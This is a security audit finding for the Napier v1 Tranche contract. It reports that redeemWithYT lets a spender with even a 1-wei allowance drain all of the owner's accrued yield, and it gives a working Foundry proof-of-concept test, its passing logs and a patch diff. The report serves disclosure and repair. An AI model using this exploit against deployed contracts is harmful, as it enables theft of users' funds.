Dancing Steel Coyote

high

# All yield could be drained if users set any ````> 0```` allowance to others

## Summary
````Tranche.redeemWithYT()```` is not well implemented, all yield could be drained if users set any ````> 0```` allowance to others.

## Vulnerability Detail
The issue arises on L283, all ````accruedInTarget```` is sent out, this will not work while users have allowances to others. Let's say, alice has ````1000 YT```` (yield token) which has generated ````100 TT```` (target token), and if she approves bob ````100 YT```` allowance, then bob should only be allowed to take the proportional target token, which is ```` 100 TT * (100 YT / 1000 YT) = 10 TT````.
```solidity
File: src\Tranche.sol
246:     function redeemWithYT(address from, address to, uint256 pyAmount) external nonReentrant returns (uint256) {
...
261:         accruedInTarget += _computeAccruedInterestInTarget(
262:             _gscales.maxscale,
263:             _lscale,
...
268:             _yt.balanceOf(from)
269:         );
..
271:         uint256 sharesRedeemed = pyAmount.divWadDown(_gscales.maxscale);
...
283:         _target.safeTransfer(address(adapter), sharesRedeemed + accruedInTarget);
284:         (uint256 amountWithdrawn, ) = adapter.prefundedRedeem(to);
...
287:         return amountWithdrawn;
288:     }

```

The following coded PoC shows all unclaimed and  unaccrued target token could be drained out, even if the allowance is as low as ````1wei````.
```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {TestTranche} from "./Tranche.t.sol";
import "forge-std/console2.sol";

contract TrancheAllowanceIssue is TestTranche {
    address bob = address(0x22);
    function setUp() public virtual override {
        super.setUp();
    }

    function testTrancheAllowanceIssue() public {
        // 1. issue some PT and YT
        deal(address(underlying), address(this), 1_000e6, true);
        tranche.issue(address(this), 1_000e6);

        // 2. generating some unclaimed yield
        vm.warp(block.timestamp + 30 days);
        _simulateScaleIncrease();

        // 3. give bob any negligible allowance, could be as low as only 1wei
        tranche.approve(bob, 1);
        yt.approve(bob, 1);

        // 4. all unclaimed and pending yield drained by bob
        assertEq(0, underlying.balanceOf(bob));
        vm.prank(bob);
        tranche.redeemWithYT(address(this), bob, 1);
        assertTrue(underlying.balanceOf(bob) > 494e6);
    }
}
```

And the logs:
```solidity
2024-01-napier\napier-v1> forge test --match-test testTrancheAllowanceIssue -vv
[⠔] Compiling...
[⠊] Compiling 42 files with 0.8.19
[⠔] Solc 0.8.19 finished in 82.11sCompiler run successful!
[⠒] Solc 0.8.19 finished in 82.11s

Running 1 test for test/unit/TrancheAllowanceIssue.t.sol:TrancheAllowanceIssue
[PASS] testTrancheAllowanceIssue() (gas: 497585)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.06ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```


## Impact
Users lost all unclaimed and unaccrued yield 

## Code Snippet
https://github.com/sherlock-audit/2024-01-napier/blob/main/napier-v1/src/Tranche.sol#L283
## Tool used

Manual Review

## Recommendation
```diff
diff --git a/napier-v1/src/Tranche.sol b/napier-v1/src/Tranche.sol
index 62d9562..65db5c6 100644
--- a/napier-v1/src/Tranche.sol
+++ b/napier-v1/src/Tranche.sol
@@ -275,12 +275,15 @@ contract Tranche is BaseToken, ReentrancyGuard, Pausable, ITranche {
         delete unclaimedYields[from];
         gscales = _gscales;

+        uint256 accruedProportional = accruedInTarget * pyAmount / _yt.balanceOf(from);
+        unclaimedYields[from] = accruedInTarget - accruedProportional;
+        
         // Burn PT and YT tokens from `from`
         _burnFrom(from, pyAmount);
         _yt.burnFrom(from, msg.sender, pyAmount);

         // Withdraw underlying tokens from the adapter and transfer them to the user
-        _target.safeTransfer(address(adapter), sharesRedeemed + accruedInTarget);
+        _target.safeTransfer(address(adapter), sharesRedeemed + accruedProportional);
         (uint256 amountWithdrawn, ) = adapter.prefundedRedeem(to);

         emit RedeemWithYT(from, to, amountWithdrawn);
```
